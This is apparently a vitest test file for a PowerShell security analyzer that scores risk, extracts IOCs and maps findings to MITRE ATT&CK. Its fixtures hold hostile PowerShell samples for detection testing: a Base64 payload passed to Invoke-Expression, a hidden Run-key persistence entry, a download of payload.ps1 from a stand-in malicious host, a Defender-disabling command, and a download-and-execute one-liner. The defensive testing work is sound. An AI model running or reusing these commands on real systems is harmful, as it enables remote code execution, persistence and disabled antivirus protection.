/**
 * Tests for the PowerShell Security Analyzer engine.
 * Run via: npx vitest run src/lib/dfir/powershell-analyzer.test.ts
 */
import { describe, it, expect } from 'vitest';
import {
  analyzePowerShell,
  detectFindings,
  extractIocs,
  analyzeObfuscation,
  calculateRisk,
  SIGNATURES,
  getMitreInfo,
} from './powershell-analyzer';

const BENIGN = `# Get running services
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName
Write-Host "Done listing services."
`;

const MALICIOUS = `# Suspicious loader
$encoded = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=='
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Persistence
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "powershell.exe -WindowStyle Hidden -e JABjAGwAaQBlAG4AdAA..."

# Network
Invoke-WebRequest -Uri "http://malicious-domain.ru/payload.ps1" -OutFile "$env:TEMP\\payload.ps1"

# Defense evasion
Set-MpPreference -DisableRealtimeMonitoring $true
`;

describe('powershell-analyzer', () => {
  it('ships 250 signatures across 13 categories', () => {
    expect(SIGNATURES.length).toBe(250);
    const categories = new Set(SIGNATURES.map((s) => s.c));
    expect(categories.size).toBe(13);
    // Every signature has the required fields + at least one MITRE technique.
    for (const s of SIGNATURES) {
      expect(s.id).toMatch(/^PSA-\d{3}$/);
      expect(s.n).toBeTruthy();
      expect(s.p).toBeTruthy();
      expect(s.m.length).toBeGreaterThan(0);
    }
  });

  it('returns a MITRE technique info for known IDs', () => {
    expect(getMitreInfo('T1059.001').tactic).toBe('Execution');
    expect(getMitreInfo('T1547.001').technique).toContain('Registry Run Keys');
    expect(getMitreInfo('NOPE').tactic).toBe('Unknown');
  });

  it('flags benign admin script as low-risk', () => {
    const r = analyzePowerShell(BENIGN);
    expect(r.risk.riskScore).toBeLessThan(40);
    expect(r.iocs.length).toBe(0);
  });

  it('flags the malicious loader with high risk + IOCs + MITRE', () => {
    const r = analyzePowerShell(MALICIOUS);

    // Findings
    expect(r.findings.length).toBeGreaterThan(5);
    expect(r.findings.some((f) => f.name === 'Invoke-Expression')).toBe(true);
    expect(r.findings.some((f) => f.category === 'Persistence')).toBe(true);
    expect(r.findings.some((f) => f.category === 'Defense Evasion')).toBe(true);

    // IOCs
    expect(r.iocs.some((i) => i.type === 'URL' && i.value.includes('malicious-domain.ru'))).toBe(true);
    expect(r.iocs.some((i) => i.type === 'Registry Path')).toBe(true);

    // Risk
    expect(r.risk.riskScore).toBeGreaterThanOrEqual(60);
    expect(['High', 'Critical']).toContain(r.risk.severity);
    expect(r.risk.mitreCount).toBeGreaterThan(0);

    // MITRE map
    expect(r.mitreMap['T1059.001']).toBeDefined();
    expect(r.mitreMap['T1547.001']).toBeDefined();

    // Obfuscation
    expect(r.obfuscation.score).toBeGreaterThan(0);
    expect(r.obfuscation.reasons.some((reason) => /Base64/i.test(reason))).toBe(true);

    // Summary mentions the risk
    expect(r.summary).toMatch(/risk/i);
  });

  it('detectFindings strips comments before matching', () => {
    // Invoke-Expression in a comment should not be flagged.
    const code = '# Invoke-Expression is mentioned here\nGet-Process\n';
    const findings = detectFindings(code);
    expect(findings.some((f) => f.name === 'Invoke-Expression')).toBe(false);
  });

  it('extractIocs deduplicates and filters false positives', () => {
    const iocs = extractIocs('Connect to https://example.com and 127.0.0.1 and 8.8.8.8');
    // example.com and localhost-ish are filtered; 8.8.8.8 stays.
    expect(iocs.some((i) => i.value === '8.8.8.8')).toBe(true);
    expect(iocs.some((i) => i.value.includes('example.com'))).toBe(false);
  });

  it('analyzeObfuscation scores base64 + char-array reconstruction', () => {
    const code =
      '[char][byte]73 + [char][byte]69\n$payload = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="';
    const o = analyzeObfuscation(code);
    expect(o.score).toBeGreaterThan(20);
    expect(o.reasons.some((r) => /Base64/i.test(r))).toBe(true);
    expect(o.reasons.some((r) => /Character array/i.test(r))).toBe(true);
  });

  it('calculateRisk applies correlation bonuses for dangerous combos', () => {
    // Execution + Network combo → +15 correlation bonus.
    const findings = detectFindings('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x.com")');
    const risk = calculateRisk(findings, 0);
    expect(risk.categories).toContain('Execution');
    expect(risk.categories).toContain('Network');
    expect(risk.riskScore).toBeGreaterThan(0);
  });
});
